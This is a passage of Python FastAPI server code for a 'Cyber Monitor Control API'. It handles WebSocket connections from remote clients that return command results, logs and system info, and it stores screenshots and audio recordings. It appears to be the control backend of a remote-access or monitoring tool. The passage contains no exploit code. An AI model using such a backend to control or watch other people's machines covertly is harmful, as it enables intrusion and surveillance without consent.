                WHERE log_type = 'info' AND message LIKE 'Client connected%'
                UNION ALL
                SELECT 
                    'command' as type,
                    (SELECT client_id FROM clients WHERE id = c.client_id) as client_id,
                    created_at as timestamp
                FROM commands c
                WHERE status = 'completed'
                ORDER BY timestamp DESC
                LIMIT 10
            """)
            recent_activity = cursor.fetchall()
            
            for activity in recent_activity:
                if activity['timestamp']:
                    activity['timestamp'] = activity['timestamp'].isoformat()
        
        # Get WebSocket connection stats
        ws_stats = manager.get_connection_stats()
        
        return {
            "success": True,
            "stats": {
                "clients": client_stats,
                "commands": command_stats,
                "media": media_stats,
                "websocket": ws_stats
            },
            "recent_activity": recent_activity,
            "timestamp": datetime.utcnow().isoformat()
        }
    except Exception as e:
        logger.error(f"Get stats error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/test-auth", response_model=dict)
async def test_auth(user: dict = Depends(authenticate_user)):
    """Test authentication endpoint"""
    return {
        "success": True,
        "message": "Authentication successful",
        "user": user,
        "timestamp": datetime.utcnow().isoformat()
    }

# ========== WEBSOCKET ENDPOINTS ==========
@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    """WebSocket endpoint for admin dashboard"""
    admin_id = None
    try:
        # Accept connection
        await websocket.accept()
        admin_id = await manager.connect_admin(websocket)
        
        # Send initial connection info
        await websocket.send_json({
            "type": "connected",
            "admin_id": admin_id,
            "timestamp": datetime.utcnow().isoformat(),
            "stats": manager.get_connection_stats()
        })
        
        # Listen for messages
        while True:
            data = await websocket.receive_json()
            
            # Handle different message types
            if data.get("type") == "ping":
                await websocket.send_json({
                    "type": "pong",
                    "timestamp": datetime.utcnow().isoformat()
                })
            elif data.get("type") == "get_stats":
                await websocket.send_json({
                    "type": "stats_update",
                    "stats": manager.get_connection_stats(),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
    except WebSocketDisconnect:
        if admin_id:
            manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Admin WebSocket error: {e}")
        if admin_id:
            manager.disconnect(websocket)

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    """WebSocket endpoint for client connections"""
    try:
        await manager.connect_client(websocket, client_id)
        
        # Send welcome message
        await websocket.send_json({
            "type": "connected",
            "client_id": client_id,
            "timestamp": datetime.utcnow().isoformat(),
            "message": "Connected to Cyber Monitor Control API"
        })
        
        # Listen for messages
        while True:
            data = await websocket.receive_json()
            data_type = data.get("type")
            
            if data_type == "heartbeat":
                # Update last seen
                try:
                    with db.get_cursor() as cursor:
                        cursor.execute("""
                            UPDATE clients 
                            SET last_seen = NOW(), online = true
                            WHERE client_id = %s
                        """, (client_id,))
                except Exception as e:
                    logger.error(f"Heartbeat update error: {e}")
                
                # Send acknowledgment
                await websocket.send_json({
                    "type": "heartbeat_ack",
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "command_result":
                # Update command status
                try:
                    with db.get_cursor() as cursor:
                        cursor.execute("""
                            UPDATE commands 
                            SET status = 'completed', 
                                result = %s, 
                                completed_at = NOW(),
                                error = %s
                            WHERE id = %s
                        """, (
                            data.get("result"),
                            data.get("error"),
                            data.get("command_id")
                        ))
                except Exception as e:
                    logger.error(f"Command result update error: {e}")
                
                # Notify admins
                await manager.notify_admins({
                    "type": "command_result",
                    "client_id": client_id,
                    "command_id": data.get("command_id"),
                    "command": data.get("command"),
                    "result": data.get("result"),
                    "error": data.get("error"),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "log":
                # Store log
                try:
                    with db.get_cursor() as cursor:
                        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (client_id,))
                        client_result = cursor.fetchone()
                        if client_result:
                            cursor.execute("""
                                INSERT INTO logs (client_id, log_type, message)
                                VALUES (%s, %s, %s)
                            """, (
                                client_result['id'],
                                data.get("log_type", "info"),
                                data.get("message", "")
                            ))
                except Exception as e:
                    logger.error(f"Log storage error: {e}")
                
                # Notify admins
                await manager.notify_admins({
                    "type": "client_log",
                    "client_id": client_id,
                    "log_type": data.get("log_type", "info"),
                    "message": data.get("message", ""),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "system_info":
                # Store system info
                try:
                    with db.get_cursor() as cursor:
                        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (client_id,))
                        client_result = cursor.fetchone()
                        if client_result:
                            cursor.execute("""
                                INSERT INTO system_info (client_id, info)
                                VALUES (%s, %s::jsonb)
                                ON CONFLICT (client_id) 
                                DO UPDATE SET info = EXCLUDED.info, created_at = NOW()
                            """, (
                                client_result['id'],
                                json.dumps(data.get("info", {}))
                            ))
                except Exception as e:
                    logger.error(f"System info storage error: {e}")
                
                # Notify admins
                await manager.notify_admins({
                    "type": "system_info",
                    "client_id": client_id,
                    "info": data.get("info", {}),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
            elif data_type == "status_update":
                # Notify admins of status change
                await manager.notify_admins({
                    "type": "client_status",
                    "client_id": client_id,
                    "status": data.get("status", {}),
                    "timestamp": datetime.utcnow().isoformat()
                })
                
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Client WebSocket error: {e}")
        manager.disconnect(websocket)

# ========== HEALTH AND INFO ==========
@app.get("/api/health", response_model=dict)
async def health_check():
    """Health check endpoint"""
    try:
        conn = db.get_connection()
        health_status = {
            "status": "healthy",
            "timestamp": datetime.utcnow().isoformat(),
            "version": "3.0",
            "database": "connected" if conn else "disconnected",
            "websocket": manager.get_connection_stats(),
            "environment": "production"
        }
        
        # Test database connection
        if conn:
            try:
                with db.get_cursor() as cursor:
                    cursor.execute("SELECT 1 as test")
                    test_result = cursor.fetchone()
                    if not test_result or test_result["test"] != 1:
                        health_status["database"] = "error"
                        health_status["status"] = "degraded"
            except Exception as e:
                health_status["database"] = f"error: {str(e)}"
                health_status["status"] = "degraded"
        else:
            health_status["status"] = "degraded"
        
        return health_status
    except Exception as e:
        logger.error(f"Health check error: {e}")
        return {
            "status": "unhealthy",
            "timestamp": datetime.utcnow().isoformat(),
            "error": str(e)
        }

@app.get("/", response_model=dict)
async def root():
    """Root endpoint with API info"""
    conn = db.get_connection()
    
    return {
        "message": "🚀 Cyber Monitor Control API",
        "version": "3.0",
        "status": "running",
        "database": "connected" if conn else "disconnected",
        "timestamp": datetime.utcnow().isoformat(),
        "endpoints": {
            "login": "POST /api/login",
            "register_client": "POST /api/register-client",
            "clients": "GET /api/clients",
            "commands": "GET /api/commands",
            "screenshots": "GET /api/screenshots",
            "audio": "GET /api/audio",
            "logs": "GET /api/logs",
            "stats": "GET /api/stats",
            "health": "GET /api/health",
            "documentation": "/docs"
        },
        "websocket": {
            "admin": "/ws/admin",
            "client": "/ws/client/{client_id}"
        }
    }

# ========== ERROR HANDLERS ==========
@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    """Handle HTTP exceptions"""
    return JSONResponse(
        status_code=exc.status_code,
        content={
            "success": False,
            "error": exc.detail,
            "path": request.url.path,
            "timestamp": datetime.utcnow().isoformat()
        }
    )

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    """Handle all other exceptions"""
    logger.error(f"Unhandled exception: {exc}", exc_info=True)
    return JSONResponse(
        status_code=500,
        content={
            "success": False,
            "error": "Internal server error",
            "path": request.url.path,
            "timestamp": datetime.utcnow().isoformat()
        }
    )

# ========== APPLICATION STARTUP ==========
@app.on_event("startup")
async def startup_event():
    """Initialize application on startup"""
    logger.info(f"🚀 Starting Cyber Monitor Control API v3.0")
    logger.info(f"📡 Port: {PORT}")
    
    # Test database connection
    conn = db.get_connection()
    if conn:
        try:
            with db.get_cursor() as cursor:
                cursor.execute("SELECT COUNT(*) as count FROM users")
                result = cursor.fetchone()
                logger.info(f"✅ Database connected - Users: {result['count']}")
                
                # Test all tables exist
                cursor.execute("""
                    SELECT table_name 
                    FROM information_schema.tables 
                    WHERE table_schema = 'public'
                    AND table_name IN ('users', 'clients', 'commands', 'screenshots', 'audio_recordings', 'logs', 'system_info')
                """)
                tables = cursor.fetchall()
                logger.info(f"✅ Tables found: {[t['table_name'] for t in tables]}")
        except Exception as e:
            logger.error(f"❌ Database test failed: {e}")
    else:
        logger.warning("⚠️  Database connection failed - Running in development mode")
    
    logger.info(f"🔗 WebSocket endpoints:")
    logger.info(f"   • Admin: ws://localhost:{PORT}/ws/admin")
    logger.info(f"   • Client: ws://localhost:{PORT}/ws/client/{{client_id}}")
    logger.info(f"📚 Documentation: http://localhost:{PORT}/docs")
    logger.info("✅ Application startup complete")

# ========== APPLICATION SHUTDOWN ==========
@app.on_event("shutdown")
async def shutdown_event():
    """Cleanup on shutdown"""
    logger.info("🛑 Shutting down Cyber Monitor Control API")
    
    # Close all WebSocket connections
    for client_id in list(manager.client_connections.keys()):
        manager.disconnect(manager.client_connections[client_id])
    
    for connection in manager.admin_connections:
        manager.disconnect(connection)
    
    logger.info("✅ Application shutdown complete")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        "main:app",
        host="0.0.0.0",
        port=PORT,
        reload=True,
        log_level="info",
        access_log=True
    )
